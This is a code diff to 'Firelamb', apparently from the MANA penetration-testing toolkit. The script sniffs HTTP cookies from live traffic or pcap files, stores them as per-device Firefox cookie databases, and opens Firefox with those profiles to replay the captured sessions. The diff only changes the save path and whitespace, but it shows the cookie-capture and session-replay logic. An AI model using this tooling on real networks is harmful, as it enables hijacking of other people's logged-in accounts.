@@ -16,7 +16,7 @@ from subprocess import Popen
 import os
 
 
-save_dir='../loot/lamb_braai/'
+save_dir='/var/lib/mana-toolkit/lamb_braai/'
 ip_logging=False
 
 
@@ -44,8 +44,8 @@ def db_insert(mac,host,name,value,address,ua,ip):
 		try:
 			tmp_save_dir=save_dir+save_to
 			cookie_file=tmp_save_dir+'/cookies.sqlite'
-			cookie_file_exists=os.path.exists(cookie_file)			
-		
+			cookie_file_exists=os.path.exists(cookie_file)
+
 			if not os.path.exists(tmp_save_dir):
                 		os.makedirs(tmp_save_dir)
 
@@ -53,7 +53,7 @@ def db_insert(mac,host,name,value,address,ua,ip):
 			sql_conns[save_to] = db.cursor()
 
 			if not cookie_file_exists:
-				
+
 				sql_conns[save_to].execute("CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, baseDomain TEXT, name TEXT, value TEXT, host TEXT, path TEXT, expiry INTEGER, lastAccessed INTEGER, creationTime INTEGER, isSecure INTEGER, isHttpOnly INTEGER, CONSTRAINT moz_uniqueid UNIQUE (name, host, path))")
 				sql_conns[save_to].execute("CREATE INDEX moz_basedomain ON moz_cookies (baseDomain)")
 			else:
@@ -62,7 +62,7 @@ def db_insert(mac,host,name,value,address,ua,ip):
 			print "MANA (FireLamb) : [!] Failed to do db"
 			traceback.print_exc(file=sys.stdout)
 			exit(-1)
-	
+
 	full_url=address
 	scheme=urlparse(address).scheme
 	scheme=(urlparse(address).scheme)
@@ -78,9 +78,9 @@ def db_insert(mac,host,name,value,address,ua,ip):
 		host_visits[save_to][address]=1
 		f.write("\n<br>\n<a href='%s'>%s</a>" %(short_url,address))
 	f.close()
-	
-		
-			
+
+
+
 
 	if address == basedomain:
 		address = "." + address
@@ -104,7 +104,7 @@ def process(pkt):
 				useragent=helper.getuseragent(tcpdata)
 				address=helper.getdsturl(tcpdata)
 				ip_src=pkt.getlayer(IP).src
-				
+
 				if cookie != None:
 					cookie=''.join(cookie)
 				else:
@@ -124,7 +124,7 @@ def process(pkt):
 					address=''
 
 
-				if cookie != '':	
+				if cookie != '':
 					cookies = cookie.split(';')
         				for name_val in cookies:
                 				eq = name_val.find('=')
@@ -188,7 +188,7 @@ def launch_firefox():
 	for f in os.listdir(save_dir):
 		if not os.path.isfile(f):
 			if os.path.exists(save_dir+f+"/cookies.sqlite"):
-				list.append(save_dir+f)			
+				list.append(save_dir+f)
 	print "MANA (FireLamb) : [+] Found %d cookie folders" %len(list)
 
 	for n in range(0,len(list)):
@@ -207,11 +207,11 @@ def launch_firefox():
 			print "MANA (FireLamb) : firefox -profile %s %s/visited.html" %(ses,ses)
 			os.system("firefox -profile %s %s/visited.html" %(ses,ses))
 	else:
-		print "MANA (FireLamb) : Exiting..."	
-			
+		print "MANA (FireLamb) : Exiting..."
+
 #Main
 def main():
-	
+
 
 	desc="Glenn's Firelamb: This tool will parse pcap files or listen on an interface for cookies. Cookies get saved to a Firefox cookies.sqlite file - one cookie file per observed device. (glenn@sensepost.com)"
 	parser=OptionParser(description=desc)
@@ -226,7 +226,7 @@ def main():
 	if (sqlv[0] <3 or sqlv[1] < 7):
 		print "MANA (FireLamb) : [!] WARNING. sqlite3 version 3.7 or greater required. You have version %s.I'll try continue, but will likely not be able to write Firefox cookie files." %sqlite3.sqlite_version
 
-	
+
 
 
 	global psl
@@ -247,7 +247,7 @@ def main():
 		launch_firefox()
 
 	else:
-		
+
 		if not os.path.exists(save_dir):
     			os.makedirs(save_dir)
 		print "MANA (FireLamb) : [+] Saving output to %s" %save_dir
